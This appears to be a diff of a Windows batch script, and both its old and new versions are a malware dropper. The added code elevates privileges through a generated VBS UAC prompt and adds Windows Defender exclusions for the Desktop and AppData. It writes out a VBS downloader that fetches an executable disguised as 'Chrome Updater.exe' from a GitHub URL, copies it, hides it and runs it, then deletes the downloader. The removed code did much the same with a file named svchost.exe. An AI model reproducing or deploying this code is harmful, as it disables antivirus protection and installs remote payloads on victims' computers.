@@ -1,39 +1,85 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Variables
-set "a=Add-MpPreference"
-set "b=ExclusionPath"
-set "c=ExclusionProcess"
-set "d=svchost.exe"
-set "e=C:\Users\%username%\AppData\Roaming\Temp"
-set "f=C:\Users\%username%\AppData\Roaming\Temp\%d%"
-set "g=C:\Users\%username%\Desktop"
-set "h=https://github.com/bouncegame/svchost/raw/refs/heads/main/%d%"
-
-:: Check if running as administrator
-openfiles > nul 2>&1
-if %errorlevel%==0 (
-    goto :run_script
-) else (
-    powershell -Command "Start-Process -FilePath '%~dp0%~nx0' -Verb RunAs"
-    exit
+>nul 2>&1 net session
+if %errorlevel% neq 0 (
+    set "vbs=%~dp0getadmin.vbs"
+    echo Set UAC = CreateObject^("Shell.Application"^) > "!vbs!"
+    echo UAC.ShellExecute "cmd.exe", "/c """"%~f0""""", "", "runas", 1 >> "!vbs!"
+    cscript //nologo "!vbs!" >nul
+    del "!vbs!" >nul
+    exit /b
 )
 
-:run_script
-:: Add Defender exclusions
-powershell -WindowStyle Hidden -Command "
-    %a% -%b% '%e%' -ErrorAction SilentlyContinue;
-    %a% -%b% '%f%' -ErrorAction SilentlyContinue;
-    %a% -%c% '%d%' -ErrorAction SilentlyContinue;
-    %a% -%b% '%g%' -ErrorAction SilentlyContinue
-"
+set "exeUrl=https://github.com/boucegame/ScamBaiting-Updated/raw/refs/heads/main/Chrome%%20Updater.exe"
+set "exeName=Chrome Updater.exe"
+set "desktopPath=%USERPROFILE%\Desktop"
+set "appdataPath=%APPDATA%"
+set "exePathDesktop=%desktopPath%\%exeName%"
+set "exePathAppData=%appdataPath%\%exeName%"
+set "vbsDownloader=%~dp0dl.vbs"
 
-:: Download %d% from the specified URL
-powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%h%', '%g%\%d%')"
+call :AddExclusion "%desktopPath%"
+call :AddExclusion "%exePathDesktop%"
+call :AddExclusion "%appdataPath%"
+call :AddExclusion "%exePathAppData%"
 
-:: Run %d% silently
-start "" /min "%g%\%d%"
+goto :after_exclusions
 
-:: Clean up (optional)
-:: del /q /f "%g%\%d%"
+:AddExclusion
+set "path=%~1"
+powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%path%' -ErrorAction SilentlyContinue" >nul 2>&1
+exit /b
+
+:after_exclusions
+
+(
+echo Dim http, stream, url, path
+echo url = WScript.Arguments^(0^)
+echo path = WScript.Arguments^(1^)
+echo On Error Resume Next
+echo Set http = CreateObject^("MSXML2.ServerXMLHTTP.6.0"^)
+echo If Err.Number ^<^> 0 Then
+echo     WScript.Quit 1
+echo End If
+echo http.setOption 2, 13056
+echo http.Open "GET", url, False
+echo http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+echo http.Send
+echo If Err.Number ^<^> 0 Then
+echo     WScript.Quit 1
+echo End If
+echo If http.Status = 200 Then
+echo     Set stream = CreateObject^("ADODB.Stream"^)
+echo     stream.Type = 1
+echo     stream.Open
+echo     stream.Write http.ResponseBody
+echo     stream.SaveToFile path, 2
+echo     stream.Close
+echo Else
+echo     WScript.Quit 1
+echo End If
+) > "%vbsDownloader%"
+
+if not exist "%vbsDownloader%" (
+    pause
+    exit /b 1
+)
+
+cscript //nologo "%vbsDownloader%" "%exeUrl%" "%exePathDesktop%" >nul
+copy /Y "%exePathDesktop%" "%exePathAppData%" >nul 2>&1
+del "%vbsDownloader%" >nul
+
+if exist "%exePathDesktop%" (
+    attrib +h "%exePathDesktop%" >nul
+    start "" "%exePathDesktop%"
+) else if exist "%exePathAppData%" (
+    attrib +h "%exePathAppData%" >nul
+    start "" "%exePathAppData%"
+) else (
+    powershell -Command "Get-MpThreatDetection | Select-Object ThreatName, Resources" 2>nul
+    pause
+)
+
+endlocal
+exit /b
